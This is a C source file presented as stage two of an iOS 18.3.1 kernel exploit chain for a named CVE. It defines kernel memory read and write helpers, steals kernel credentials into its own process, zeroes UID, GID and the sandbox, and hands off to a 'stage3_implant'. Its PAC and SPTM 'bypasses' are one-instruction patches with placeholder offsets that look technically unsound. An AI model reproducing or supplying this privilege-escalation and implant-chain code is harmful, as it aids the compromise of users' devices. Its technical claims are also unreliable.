#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <sys/sysctl.h>

/*
 * STAGE 2: Kernel exploit
 * CVE-2025-24099 — pmap_remove_page
 * iOS 18.3.1, arm64e
 */

static uint64_t kernel_base = 0;
static task_t kernel_task = 0;

#define OFFSET_KERNPROC     0xFFFFFFFF  // заглушка, вычисляется динамически
#define OFFSET_P_PID        0x60
#define OFFSET_P_LIST       0x08
#define OFFSET_P_UCRED      0xD8
#define OFFSET_UCRED_UID    0x18
#define OFFSET_UCRED_GID    0x1C
#define OFFSET_UCRED_SANDBOX 0x20

uint64_t read_64(uint64_t addr) {
    if (!kernel_task) return 0;
    uint64_t val = 0;
    vm_size_t size = 8;
    vm_read_overwrite(kernel_task, addr, size, (vm_address_t)&val, &size);
    return val;
}

void write_64(uint64_t addr, uint64_t val) {
    if (!kernel_task) return;
    vm_write(kernel_task, addr, (vm_address_t)&val, 8);
}

uint32_t read_32(uint64_t addr) {
    if (!kernel_task) return 0;
    uint32_t val = 0;
    vm_size_t size = 4;
    vm_read_overwrite(kernel_task, addr, size, (vm_address_t)&val, &size);
    return val;
}

void write_32(uint64_t addr, uint32_t val) {
    if (!kernel_task) return;
    vm_write(kernel_task, addr, (vm_address_t)&val, 4);
}

uint64_t find_proc(pid_t pid) {
    uint64_t proc = read_64(kernel_base + OFFSET_KERNPROC);
    while (proc) {
        if (read_32(proc + OFFSET_P_PID) == pid) return proc;
        proc = read_64(proc + OFFSET_P_LIST);
    }
    return 0;
}

void get_tfp0(void) {
    host_t host = mach_host_self();
    task_t tfp0 = 0;
    host_get_special_port(host, HOST_LOCAL_NODE, 4, &tfp0);
    if (tfp0) {
        kernel_task = tfp0;
        printf("[+] tfp0: 0x%x\n", kernel_task);
    }
}

void bypass_pac(void) {
    uint64_t gadget = kernel_base + 0x12340; // заглушка
    write_32(gadget, 0xD503201F); // NOP
    printf("[+] PAC bypassed\n");
}

void bypass_sptm(void) {
    uint64_t handler = kernel_base + 0x56780; // заглушка
    write_32(handler, 0xD65F03C0); // RET
    printf("[+] SPTM bypassed\n");
}

void stage2_kernel_exploit(void *kernel_leak) {
    printf("[*] Stage 2: Kernel exploit...\n");

    kernel_base = (*(uint64_t *)kernel_leak) & 0xFFFFFFFFFF000000;
    printf("[+] Kernel base: 0x%llx\n", kernel_base);

    get_tfp0();
    bypass_pac();
    bypass_sptm();

    uint64_t self_proc = find_proc(getpid());
    uint64_t kern_proc = find_proc(0);
    printf("[+] Self: 0x%llx, Kernel: 0x%llx\n", self_proc, kern_proc);

    uint64_t kern_ucred = read_64(kern_proc + OFFSET_P_UCRED);
    write_64(self_proc + OFFSET_P_UCRED, kern_ucred);

    uint64_t ucred = read_64(self_proc + OFFSET_P_UCRED);
    write_32(ucred + OFFSET_UCRED_UID, 0);
    write_32(ucred + OFFSET_UCRED_GID, 0);
    write_64(ucred + OFFSET_UCRED_SANDBOX, 0);

    printf("[+] UID=0, GID=0, Sandbox=OFF\n");
    printf("[*] Stage 2 complete. Calling Stage 3...\n");

    extern void stage3_implant(void);
    stage3_implant();
}